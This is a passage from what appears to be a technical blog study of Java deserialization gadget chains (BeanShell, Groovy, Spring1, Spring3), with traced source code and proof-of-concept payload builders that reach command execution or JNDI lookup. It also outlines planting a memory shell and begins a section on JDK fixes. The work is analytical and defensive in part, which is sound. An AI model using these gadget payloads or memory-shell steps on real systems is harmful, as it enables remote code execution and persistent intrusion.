<code>XThis$Handler</code> type. <code>Handler</code> implements <code>InvocationHandler</code> interface and delegates methods invocation request to the method with the same signature in current namespace. To check this, step into <code>This.invokeMethod()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(   </span><br><span class="hljs-params">   String methodName, Object [] args,   </span><br><span class="hljs-params">Interpreter interpreter, CallStack callstack, SimpleNode callerInfo,   </span><br><span class="hljs-params"><span class="hljs-type">boolean</span> declaredOnly  )</span>   <br>   <span class="hljs-keyword">throws</span> EvalError  <br>&#123;<br>...<br>Class [] types = Types.getTypes( args );  <br><span class="hljs-type">BshMethod</span> <span class="hljs-variable">bshMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br><span class="hljs-keyword">try</span> &#123;  <br>   bshMethod = namespace.getMethod( methodName, types, declaredOnly );  <br>&#125; <span class="hljs-keyword">catch</span> ( UtilEvalError e ) &#123;  <br>   <span class="hljs-comment">// leave null  </span><br>&#125;  <br>  <br><span class="hljs-keyword">if</span> ( bshMethod != <span class="hljs-literal">null</span> )  <br>   <span class="hljs-keyword">return</span> bshMethod.invoke( args, interpreter, callstack, callerInfo );<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>This means that we can extract the <code>invocationHandler</code> of a <code>XThis</code> object and build a proxy on it. When a method like <code>compare()</code> is invoked on this proxy, it would result in the invocation of the bsh method <code>compare()</code> defined in current namespace. And the <code>invocationHandler</code> does not require any modification. What we should do is to define a <code>compare()</code> method by bsh interpreter.</p><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> BeanShellUtil.makeBeanShellPayload(command);  <br><span class="hljs-comment">// payload: compare(Object su18, Object su19) &#123;new java.lang.ProcessBuilder(new String[]&#123;&quot;calc.exe&quot;&#125;</span><br><span class="hljs-type">Interpreter</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Interpreter</span>();  <br>Reflections.getMethodAndInvoke(i, <span class="hljs-string">&quot;setu&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Object.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;bsh.cwd&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>&#125;);  <br>i.eval(payload);  <br><span class="hljs-type">XThis</span> <span class="hljs-variable">xt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XThis</span>(i.getNameSpace(), i);  <br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) Reflections.getField(xt.getClass(), <span class="hljs-string">&quot;invocationHandler&quot;</span>).get(xt);  <br>Comparator&lt;? <span class="hljs-built_in">super</span> Object&gt; comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Comparator.class&#125;, handler);  <br>PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);  <br>Object[] queue = &#123;Integer.valueOf(<span class="hljs-number">1</span>), Integer.valueOf(<span class="hljs-number">1</span>)&#125;;  <br>Reflections.setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, queue);  <br>Reflections.setFieldValue(priorityQueue, <span class="hljs-string">&quot;size&quot;</span>, Integer.valueOf(<span class="hljs-number">2</span>));  <br><span class="hljs-keyword">return</span> priorityQueue;<br></code></pre></td></tr></table></figure><h2 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h2><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.codehaus.groovy:groovy:2.3.9</p></blockquote><p>This gadget can use both <code>AnnotationInvocationHandler</code> or <code>PriorityQueue</code>, we use the later as example.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>execute:<span class="hljs-number">530</span>, ProcessGroovyMethods (org.codehaus.groovy.runtime)<br>doMethodInvoke:-<span class="hljs-number">1</span>, dgm$<span class="hljs-number">748</span> (org.codehaus.groovy.runtime)<br>invokeMethod:<span class="hljs-number">1207</span>, MetaClassImpl (groovy.lang)<br>invokeMethod:<span class="hljs-number">1074</span>, MetaClassImpl (groovy.lang)<br>invokeMethod:<span class="hljs-number">1016</span>, MetaClassImpl (groovy.lang)<br>call:<span class="hljs-number">423</span>, Closure (groovy.lang)<br>invokeCustom:<span class="hljs-number">51</span>, ConvertedClosure (org.codehaus.groovy.runtime)<br>invoke:<span class="hljs-number">103</span>, ConversionHandler (org.codehaus.groovy.runtime)<br>entrySet:-<span class="hljs-number">1</span>, $Proxy4 (com.sun.proxy)<br>readObject:<span class="hljs-number">452</span>, AnnotationInvocationHandler (sun.reflect.annotation)<br></code></pre></td></tr></table></figure><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">ConvertedClosure</span> <span class="hljs-variable">closure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConvertedClosure</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(command, <span class="hljs-string">&quot;execute&quot;</span>), <span class="hljs-string">&quot;entrySet&quot;</span>);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> Gadgets.createProxy(closure, Map.class);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Gadgets.createMemoizedInvocationHandler(map);  <br>  <br><span class="hljs-keyword">return</span> handler;<br></code></pre></td></tr></table></figure><p>The <code>ConvertedClosure</code> class is an <code>InvocationHandler</code> bounded to a single method, i.e. only if its bounded method can be invoked. And the invocation can be delegated to another <code>Closure</code>(here is <code>MethodClosure</code>).<br>Step into its super class <code>ConversionHandler</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>    <span class="hljs-type">VMPlugin</span> <span class="hljs-variable">plugin</span> <span class="hljs-operator">=</span> VMPluginFactory.getPlugin();  <br>    <span class="hljs-keyword">if</span> (plugin.getVersion()&gt;=<span class="hljs-number">7</span> &amp;&amp; isDefaultMethod(method)) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">handle</span> <span class="hljs-operator">=</span> handleCache.get(method);  <br>        <span class="hljs-keyword">if</span> (handle == <span class="hljs-literal">null</span>) &#123;  <br>            handle = plugin.getInvokeSpecialHandle(method, proxy);  <br>            handleCache.put(method, handle);  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> plugin.invokeHandle(handle, args);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> (!checkMethod(method)) &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> invokeCustom(proxy, method, args);  <br>        &#125; <span class="hljs-keyword">catch</span> (GroovyRuntimeException gre) &#123;  <br>            <span class="hljs-keyword">throw</span> ScriptBytecodeAdapter.unwrap(gre);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>, args);  <br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ite) &#123;  <br>        <span class="hljs-keyword">throw</span> ite.getTargetException();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>We should make control dive into <code>invokeCustom()</code>.<br>Look at <code>ConvertedClosure</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeCustom</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span>  <br><span class="hljs-keyword">throws</span> Throwable &#123;  <br>    <span class="hljs-keyword">if</span> (methodName!=<span class="hljs-literal">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    <span class="hljs-keyword">return</span> ((Closure) getDelegate()).call(args);  <br>&#125;<br></code></pre></td></tr></table></figure><p>In <code>MethodClosure</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">doCall</span><span class="hljs-params">(Object arguments)</span> &#123;<br>    <span class="hljs-keyword">return</span> InvokerHelper.invokeMethod(getOwner(), method, arguments);  <br>&#125;<br></code></pre></td></tr></table></figure><p>Finally, in <code>ProcessGroovyMethods</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String self)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>    <span class="hljs-keyword">return</span> Runtime.getRuntime().exec(self);  <br>&#125;<br></code></pre></td></tr></table></figure><p>So the whole procedure is:<br>deserialize <code>AnnotationInvocationHandler</code>  &#x3D;&gt;<br><code>entrySet()</code> is called upon <code>ConvertedClosure</code> &#x3D;&gt;<br>delegate to <code>MethodClosure</code> &#x3D;&gt;<br>call groovy integrated method <code>execute()</code></p><p>End.</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK1.7<br>org.springframework:spring-core:4.1.4.RELEASE</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br><br>ObjectInputStream.readObject()<br>SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()<br>SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>AnnotationInvocationHandler.invoke()<br>HashMap.get()<br>ReflectionUtils.findMethod()<br>SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>AnnotationInvocationHandler.invoke()<br>HashMap.get()<br>ReflectionUtils.invokeMethod()<br>Method.invoke()<br>Templates(Proxy).newTransformer()<br>AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()<br>ObjectFactory(Proxy).getObject()<br>AnnotationInvocationHandler.invoke()<br>HashMap.get()<br>Method.invoke()<br>TemplatesImpl.newTransformer()<br>TemplatesImpl.getTransletInstance()<br>TemplatesImpl.defineTransletClasses()<br>TemplatesImpl.TransletClassLoader.defineClass()<br>Pwner*(Javassist-generated).&lt;<span class="hljs-keyword">static</span> init&gt;<br>Runtime.exec()<br></code></pre></td></tr></table></figure><h4 id="AnnotationInvocationHandler-special-functionality"><a href="#AnnotationInvocationHandler-special-functionality" class="headerlink" title="AnnotationInvocationHandler special functionality"></a>AnnotationInvocationHandler special functionality</h4><p>The <code>AnnotationInvocationHandler</code> class is able to overwrite a proxied method, return the designated value when call it. We can look at its <code>invoke()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>...<br><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>...<br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>And <code>memberValues</code> is built within <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    ...<br>    Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(<span class="hljs-string">&quot;memberValues&quot;</span>, <span class="hljs-literal">null</span>);<br>    ...<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;<br>    ...<br>    mv.put(name, value);<br>    ...<br>&#125;<br>UnsafeAccessor.setMemberValues(<span class="hljs-built_in">this</span>, mv);<br>&#125;<br></code></pre></td></tr></table></figure><p>There is an constraint that the type of <code>memberValues</code> should equals to that of the return type of the method to be hooked.</p><h4 id="Kick-off-MethodInvokeTypeProvider"><a href="#Kick-off-MethodInvokeTypeProvider" class="headerlink" title="Kick-off : MethodInvokeTypeProvider"></a>Kick-off : MethodInvokeTypeProvider</h4><p><code>MethodInvokeTypeProvider</code> class is an inner class of <code>org.springframework.core.SerializableTypeWrapper</code>. In its <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>   inputStream.defaultReadObject();  <br>   <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);  <br>   <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());  <br>&#125;<br></code></pre></td></tr></table></figure><p>If we can control <code>methodName</code> and <code>provider.getType()</code>, then we can execute any code.<br>By using the measure introduced [[Java Deserialize Vulnerabilities ysoserial study#AnnotationInvocationHandler special functionality|here]], we can hook <code>getType()</code> to return an object in <code>Type</code> class. It is expected to get a <code>TemplatesImpl</code> when call <code>getType()</code> and invoke its <code>newTransformer()</code>. So we need to introduce <code>ObjectFactoryDelegatingInvocationHandler</code>.</p><h4 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h4><p>It is an inner class of <code>org.springframework.beans.factory.support.AutowireUtils</code>. It is an <code>InvocationHandler</code>. Let’s look at its <code>invoke()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();  <br>    <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> proxy == args[<span class="hljs-number">0</span>];  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> System.identityHashCode(proxy);  <br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.objectFactory.toString();  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.objectFactory.getObject(), args);  <br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var6) &#123;  <br>            <span class="hljs-keyword">throw</span> var6.getTargetException();  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>The invocation will be delegated to the object returned by <code>objectFactory</code>. We can create an <code>ObjectFactory</code> proxy and hook <code>getObject()</code> method for returning <code>TemplatesImpl</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">ObjectFactory</span> <span class="hljs-variable">objectFactoryProxy</span> <span class="hljs-operator">=</span>  <br>      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="hljs-string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);<br></code></pre></td></tr></table></figure><p>Equip <code>ObjectFactoryDelegatingInvocationHandler</code> with this <code>ObjectFactory</code> and create a <code>Type</code> proxy:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplatesProxy</span> <span class="hljs-operator">=</span> Gadgets.createProxy((InvocationHandler)  <br>      Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  <br>         .newInstance(objectFactoryProxy), Type.class, Templates.class);<br></code></pre></td></tr></table></figure><p>Build <code>TypeProvider</code> proxy to hook <code>getType()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Gadgets.createMemoitizedProxy(  <br>      Gadgets.createMap(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplatesProxy),  <br>      forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));<br></code></pre></td></tr></table></figure><p>Build <code>MethodInvokeTypeProvider</code> and modify <code>methodName</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Constructor</span> <span class="hljs-variable">mitpCtor</span> <span class="hljs-operator">=</span> Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">mitp</span> <span class="hljs-operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;), <span class="hljs-number">0</span>);  <br>Reflections.setFieldValue(mitp, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><span class="hljs-keyword">return</span> nitp;<br></code></pre></td></tr></table></figure><p>Whole Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">ObjectFactory</span> <span class="hljs-variable">objectFactoryProxy</span> <span class="hljs-operator">=</span>  <br>      Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="hljs-string">&quot;getObject&quot;</span>, templates), ObjectFactory.class);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplatesProxy</span> <span class="hljs-operator">=</span> Gadgets.createProxy((InvocationHandler)  <br>      Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>)  <br>         .newInstance(objectFactoryProxy), Type.class, Templates.class);  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Gadgets.createMemoitizedProxy(  <br>      Gadgets.createMap(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplatesProxy),  <br>      forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));  <br>  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Constructor</span> <span class="hljs-variable">mitpCtor</span> <span class="hljs-operator">=</span> Reflections.getFirstCtor(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">mitp</span> <span class="hljs-operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;), <span class="hljs-number">0</span>);  <br>Reflections.setFieldValue(mitp, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);  <br>  <br><span class="hljs-keyword">return</span> mitp;<br></code></pre></td></tr></table></figure><h3 id="Spring3"><a href="#Spring3" class="headerlink" title="Spring3"></a>Spring3</h3><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.springframework:spring-tx:5.2.3.RELEASE<br>org.springframework:spring-context:5.2.3.RELEASE<br>javax.transaction:javax.transaction-api:1.2</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain</span><br>lookup:<span class="hljs-number">179</span>, JndiTemplate (org.springframework.jndi)<br>lookupUserTransaction:<span class="hljs-number">571</span>, JtaTransactionManager (org.springframework.transaction.jta)<br>initUserTransactionAndTransactionManager:<span class="hljs-number">448</span>, JtaTransactionManager (org.springframework.transaction.jta)<br>readObject:<span class="hljs-number">1206</span>, JtaTransactionManager (org.springframework.transaction.jta)<br></code></pre></td></tr></table></figure><p><code>JtaTransactionManager</code> class will look up JNDI URL stored in <code>userTransactionName</code> when deserializing.<br>This vul is quite simple without needing to analyze.<br>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jndiURL</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br><span class="hljs-keyword">if</span> (command.toLowerCase().startsWith(<span class="hljs-string">&quot;jndi:&quot;</span>)) &#123;  <br>   jndiURL = command.substring(<span class="hljs-number">5</span>);  <br>&#125;  <br>  <br><span class="hljs-type">JtaTransactionManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JtaTransactionManager</span>();  <br>manager.setUserTransactionName(jndiURL);  <br><span class="hljs-keyword">return</span> manager;<br></code></pre></td></tr></table></figure><hr><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h2 id="Insert-memory-shell-through-deserialization-vulnerability"><a href="#Insert-memory-shell-through-deserialization-vulnerability" class="headerlink" title="Insert memory shell through deserialization vulnerability"></a>Insert memory shell through deserialization vulnerability</h2><ol><li>Create a memory shell class(e.g. <code>EvilFilter</code>) and override the required method</li><li>Write code for inserting memory shell in a static code block of a certain class(normally the memory shell class itself)</li><li>Select a script engine(JavaScript, BeanShell, Python, etc.). Prepare the script code in which define an evil class to insert memory shell and create a new instance to trigger the static code block</li><li>Execute script through deserialization vulnerability.</li></ol><hr><h2 id="Fixes"><a href="#Fixes" class="headerlink" title="Fixes"></a>Fixes</h2><h3 id="JDK-fixes"><a href="#JDK-fixes" class="headerlink" title="JDK fixes"></a>JDK fixes</h3><h4 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h4><p>This article<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Paper/浅谈Java反序列化漏洞修复方案.md at master · Cryin/Paper](https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md)">[1]</span></a></sup> introduces security updates for serialization in JDK1.8. In summary, there are three strengthening methods introduced in JDK1.8:</p><ol><li>Override <code>ObjectInputStream</code>‘s <code>resolveClass</code> or <code>resolveProxyClass</code> method</li><li>Use <code>ValidatingObjectInputStream</code> to decorate <code>ObjectInputStream</code> to deploy white-list validation</li><li>Create an <code>ObjectInputFilter</code> class overriding <code>checkInput</code> method, and decorate an 